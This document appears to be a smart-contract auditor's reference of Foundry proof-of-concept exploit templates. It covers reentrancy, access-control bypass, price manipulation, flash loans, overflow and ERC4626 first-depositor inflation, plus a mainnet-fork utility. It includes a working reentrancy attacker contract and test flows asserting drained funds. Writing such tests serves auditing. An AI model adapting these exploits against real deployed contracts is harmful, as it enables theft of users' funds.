# PoC Templates by Bug Class

## Table of Contents

1. [Base Template](#base-template)
2. [Reentrancy](#reentrancy)
3. [Access Control Bypass](#access-control-bypass)
4. [Price Manipulation](#price-manipulation)
5. [Flash Loan Attack](#flash-loan-attack)
6. [Integer Overflow/Underflow](#integer-overflowunderflow)
7. [First Depositor Attack](#first-depositor-attack)

---

## Base Template

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import "forge-std/console2.sol";

contract PoC_H01_BugClass is Test {
    // ========== State Variables ==========
    VulnerableContract target;

    address attacker;
    address victim;

    uint256 attackerInitialBalance;
    uint256 targetInitialBalance;

    // ========== setUp: Preconditions ==========
    function setUp() public {
        // 1. Create labeled actors
        attacker = makeAddr("attacker");
        victim = makeAddr("victim");

        // 2. Deploy target contract
        target = new VulnerableContract();
        vm.label(address(target), "Target");

        // 3. Set initial funds (from Attack Scenario Preconditions)
        vm.deal(address(target), 100 ether);
        vm.deal(attacker, 1 ether);

        // 4. Record initial state
        attackerInitialBalance = attacker.balance;
        targetInitialBalance = address(target).balance;
    }

    // ========== test_Exploit: Attack Steps ==========
    function test_Exploit_H01() public {
        // ===== BEFORE STATE =====
        console2.log("=== Initial State ===");
        console2.log("Attacker balance:", attackerInitialBalance / 1e18, "ETH");
        console2.log("Target balance:", targetInitialBalance / 1e18, "ETH");

        // ===== EXECUTE ATTACK =====
        vm.startPrank(attacker);
        // Attack steps here...
        vm.stopPrank();

        // ===== AFTER STATE =====
        uint256 attackerFinalBalance = attacker.balance;
        uint256 targetFinalBalance = address(target).balance;
        uint256 profit = attackerFinalBalance - attackerInitialBalance;

        console2.log("=== Final State ===");
        console2.log("Attacker balance:", attackerFinalBalance / 1e18, "ETH");
        console2.log("Target balance:", targetFinalBalance / 1e18, "ETH");
        console2.log("Profit:", profit / 1e18, "ETH");

        // ===== IMPACT VERIFICATION =====
        assertGt(attackerFinalBalance, attackerInitialBalance, "Attacker must profit");
        assertLt(targetFinalBalance, targetInitialBalance, "Target must lose funds");
    }
}
```

---

## Reentrancy

```solidity
// Attacker contract for reentrancy
contract ReentrancyAttacker {
    VulnerableVault target;
    uint256 public attackCount;
    uint256 public maxAttacks;

    constructor(address _target, uint256 _maxAttacks) {
        target = VulnerableVault(_target);
        maxAttacks = _maxAttacks;
    }

    function attack() external payable {
        target.deposit{value: msg.value}();
        target.withdraw(msg.value);
    }

    receive() external payable {
        if (attackCount < maxAttacks && address(target).balance >= 1 ether) {
            attackCount++;
            target.withdraw(1 ether);
        }
    }
}

// In test contract
function test_Exploit_Reentrancy() public {
    ReentrancyAttacker attackerContract = new ReentrancyAttacker(
        address(target),
        10  // max reentrancy depth
    );
    vm.deal(address(attackerContract), 1 ether);

    uint256 targetBefore = address(target).balance;

    attackerContract.attack();

    uint256 targetAfter = address(target).balance;
    uint256 stolen = targetBefore - targetAfter;

    console2.log("Stolen:", stolen / 1e18, "ETH");
    assertGt(stolen, 1 ether, "More than deposit stolen via reentrancy");
}
```

---

## Access Control Bypass

```solidity
function test_Exploit_AccessControl() public {
    // 1. Verify attacker is NOT privileged
    assertFalse(target.hasRole(ADMIN_ROLE, attacker), "Attacker should not be admin");

    uint256 targetBefore = address(target).balance;

    // 2. Call admin function without authorization
    vm.prank(attacker);
    target.adminWithdraw(address(target).balance);

    // 3. Verify unauthorized access succeeded
    uint256 targetAfter = address(target).balance;

    console2.log("Drained:", (targetBefore - targetAfter) / 1e18, "ETH");
    assertEq(targetAfter, 0, "Funds drained without authorization");
}
```

---

## Price Manipulation

```solidity
function test_Exploit_PriceManipulation() public {
    // 1. Record expected value BEFORE manipulation
    uint256 sharesBefore = vault.balanceOf(attacker);
    uint256 expectedPayout = vault.convertToAssets(sharesBefore);

    // 2. Manipulate price (swap, flash loan, direct donation)
    vm.startPrank(attacker);

    // Example: Direct donation to inflate share price
    token.transfer(address(vault), manipulationAmount);

    // OR: Swap to manipulate oracle
    // router.swap(largeAmount, 0, attacker, "");

    // 3. Execute action at manipulated price
    uint256 actualPayout = vault.redeem(sharesBefore, attacker, attacker);
    vm.stopPrank();

    // 4. Calculate and verify profit
    uint256 profit = actualPayout - expectedPayout;

    console2.log("Expected payout:", expectedPayout / 1e18);
    console2.log("Actual payout:", actualPayout / 1e18);
    console2.log("Manipulation profit:", profit / 1e18);

    assertGt(actualPayout, expectedPayout, "Price manipulation successful");
}
```

---

## Flash Loan Attack

```solidity
// Flash loan callback contract
contract FlashLoanAttacker is IFlashLoanReceiver {
    address target;
    IERC20 token;

    function executeOperation(
        address asset,
        uint256 amount,
        uint256 premium,
        address initiator,
        bytes calldata params
    ) external returns (bool) {
        // Attack logic during flash loan
        // e.g., price manipulation, governance attack

        // Repay flash loan
        IERC20(asset).approve(msg.sender, amount + premium);
        return true;
    }
}

// In test contract
function test_Exploit_FlashLoan() public {
    FlashLoanAttacker attackerContract = new FlashLoanAttacker(
        address(target),
        address(token)
    );

    uint256 attackerBefore = token.balanceOf(attacker);

    vm.startPrank(attacker);
    flashLoanProvider.flashLoan(
        address(attackerContract),
        address(token),
        flashAmount,
        abi.encode(/* attack params */)
    );
    vm.stopPrank();

    uint256 attackerAfter = token.balanceOf(attacker);
    uint256 profit = attackerAfter - attackerBefore;

    console2.log("Profit after flash loan:", profit / 1e18);
    assertGt(profit, 0, "Profit after flash loan repayment");
}
```

---

## Integer Overflow/Underflow

```solidity
function test_Exploit_Overflow() public {
    // Pre-Solidity 0.8.0 or unchecked block

    uint256 attackerBefore = target.balanceOf(attacker);

    vm.prank(attacker);
    // Trigger overflow: e.g., withdraw more than balance
    target.withdraw(type(uint256).max);

    uint256 attackerAfter = target.balanceOf(attacker);

    console2.log("Balance before:", attackerBefore);
    console2.log("Balance after:", attackerAfter);

    assertGt(attackerAfter, attackerBefore, "Balance increased via overflow");
}
```

---

## First Depositor Attack

```solidity
function test_Exploit_FirstDepositor() public {
    // ERC4626 vault inflation attack

    // 1. Attacker is first depositor with minimal amount
    vm.startPrank(attacker);
    token.approve(address(vault), type(uint256).max);
    vault.deposit(1, attacker);  // Get 1 share

    // 2. Attacker donates tokens directly to inflate share price
    token.transfer(address(vault), 1e18);  // Donate 1 token
    vm.stopPrank();

    // 3. Victim deposits
    vm.startPrank(victim);
    token.approve(address(vault), type(uint256).max);
    uint256 victimShares = vault.deposit(2e18, victim);  // Should get ~2 shares
    vm.stopPrank();

    console2.log("Victim deposited:", 2e18 / 1e18, "tokens");
    console2.log("Victim received:", victimShares, "shares");

    // 4. Due to rounding, victim gets fewer shares
    assertLt(victimShares, 2, "Victim lost value to first depositor attack");

    // 5. Attacker redeems and profits
    vm.prank(attacker);
    uint256 attackerPayout = vault.redeem(1, attacker, attacker);

    console2.log("Attacker deposited: 1 wei + 1 token donation");
    console2.log("Attacker received:", attackerPayout / 1e18, "tokens");

    assertGt(attackerPayout, 1e18, "Attacker profited from inflation attack");
}
```

---

## Common Utilities

### Time Manipulation

```solidity
// Advance timestamp
vm.warp(block.timestamp + 1 days);

// Advance block number
vm.roll(block.number + 100);

// Skip duration
skip(7 days);
```

### Fork Testing

```solidity
function setUp() public {
    vm.createSelectFork("mainnet", 18000000);
    target = ITarget(MAINNET_ADDRESS);
}
```

### State Snapshots

```solidity
uint256 snapshotId = vm.snapshot();
// ... do something
vm.revertTo(snapshotId);  // Restore state
```
